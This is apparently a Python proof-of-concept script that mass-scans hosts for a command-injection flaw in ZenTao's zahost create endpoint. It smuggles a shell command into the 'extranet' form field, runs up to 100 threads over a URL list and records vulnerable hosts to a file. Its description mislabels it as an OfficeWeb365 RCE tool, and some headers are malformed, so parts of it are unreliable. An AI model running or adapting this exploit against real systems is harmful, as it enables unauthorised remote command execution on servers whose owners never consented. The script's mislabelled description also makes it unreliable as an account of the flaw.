import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
    
        ███████╗██╗  ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ 
        ██╔════╝██║  ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
        ███████╗███████║███████║██╔██╗ ██║██║  ██║███████║██║   ██║
        ╚════██║██╔══██║██╔══██║██║╚██╗██║██║  ██║██╔══██║██║   ██║
        ███████║██║  ██║██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
                                                                    author:秋妤
                                                                    time:2024.9.16
                                                                    version:1.0
                                                           
    """
    print(test)


def poc(target):
    payload = '/zentaopms/www/index.php?m=zahost&f=create'
    headers = {
        'UserAgent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/110.0Accept:application/json,text/javascript,*/*;q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Referer:http':'//127.0.0.1/zentaopms/www/index.php?m=zahost&f=create',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Length':'134',
        'Origin':'http://127.0.0.1',
        'Connection':'close',
        'Cookie':'zentaosid=dhjpu2i3g51l6j5eba85aql27f;lang=zhcn;device=desktop;theme=default;tab=qa;windowWidth=1632;windowHeight=783',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
    }
    data = 'vsoft=kvm&hostType=physical&name=test2&extranet=127.0.0.1%7Cecho%20Hello&cpuCores=2&memory=1&diskSize=1&desc=&uid=64e46f386d9ea&type=za'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'Hello' in res.text:
            print(f"[+]{target}存在漏洞\n")
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)

def main():
    banner()
    parser = argparse.ArgumentParser(description='OfficeWeb365 远程代码执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

if __name__ == '__main__':
    main()